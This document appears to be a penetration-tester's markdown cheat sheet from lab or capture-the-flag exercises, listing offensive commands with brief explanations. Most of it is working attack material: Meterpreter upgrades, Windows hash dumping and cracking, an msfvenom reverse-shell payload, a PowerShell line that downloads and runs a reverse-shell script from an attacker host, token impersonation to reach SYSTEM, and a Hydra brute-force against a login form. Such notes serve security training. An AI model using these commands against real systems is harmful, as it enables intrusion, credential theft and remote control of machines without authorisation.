# Some useful commands for enumeration
First list all your sessions
```console
sessions 
```
Select the session that you wanna upgrade to meterpreter and run:
```console
session -u <number>
```
Another option is to use
```console
use post/multi/manage/shell_to_meterpreter
```

To choose get into the meterpreter session:
```console
sessions -i 2
```
Tip migration to spoolsv.exe (print service) is always advisable (due to stability)

To dump the hashes of Windows using the Meterpreter:
```console
hashdump
```

To crack the hash use:
```console
john john_hash --format=NT --wordlist=/usr/share/wordlist/rockyou.txt
```

To showed the cracked result:
```console
john john_hash --format=NT --show
```

To enumerate smb shares:
```console
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target_ip>
```

To enumerate file system:
```console
nmap -p <number> --script=nfs-ls,nfs-statfs,nfs-showmount <target_ip>
```

# SSH commands
To login with a particular private key
```console
ssh -i id_rsa <username>@<target_ip>
```

# Search commands
To look for SUID (suid) bits enable:
```console
find / -perm -u=s -type f 2>/dev/null
```

# Upgrade shell to meterpreter
```console
search multi/manage/shell_to_meterpreter
```

# Load and run powershell in meterpreter
```console
load powershell
powershell_shell
```

# To create a msfvenoms payload with meterpreter reverse shell
```console
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.146.199 LPORT=4444 -f exe -o alfred.exe
```

# To download from a python server using powershell
```console
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.146.199:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.146.199 -Port 4343
```
or
```console
powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe
```

# To see privilege information in windows
```console
whoami /priv
```

# To impersonate other tokens using meterpreter
```console
load incognito
list_tokens -g
```

# To become NT system
```console
impersonate_token "BUILTIN\Administrators"
then migrate to a SYSTEM process (usually services.exe)
migrate <PID of services.exe>          
```

# Hydra brute force post
The http-post-form method require three arguments splitted by ":"
1. "Account/login.aspx", which you get from the URL 
2. "\_\_VIEWSTATE...Log+in", which you get using Burpsuite. Observe that you need also to insert ^USER^ and ^PASS^
3. Login Failed. Which is the most common case, deviations will be given as output.

```console
hydra - v -l admin -P /usr/share/wordlist/rockyou.txt <target_IP> http-post-form "/Account/login.aspx:__VIEWSTATE=i7MQNEYxCpsuWpX%2FARpaWiNDZbLxzhra5gcXSs0jSsiEg18uQztWWGsZy4ofbcUHTEqDrAnDifUKYN%2FCBdKAokaVydVNCiAwGHV4kPsIPzXP3xuFzYfOcCIDtBW0F7mNfw2AT%2BVl2rNLN4Cr8Ur9ReRZUq7%2BzU8yJjvGQcuanNcRj05P&__EVENTVALIDATION=wxH6yuXUPcWQy8HL%2F3WLAm2XyiAzbFlRZrMVEfPOK8DEZRYsARugOtVfq0q8lMKCsGX7%2BF0CdBZGVhwG97qfj%2FqoPwGgR9Hivgq8btr6BxRC28PmKpSu%2BlSYF36OVMJbTQ%2BmYqHRNXE44DKvaSrQ%2F9Ki%2F%2FQ%2FUC%2FW6fIzV7I7M5BQFijq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```
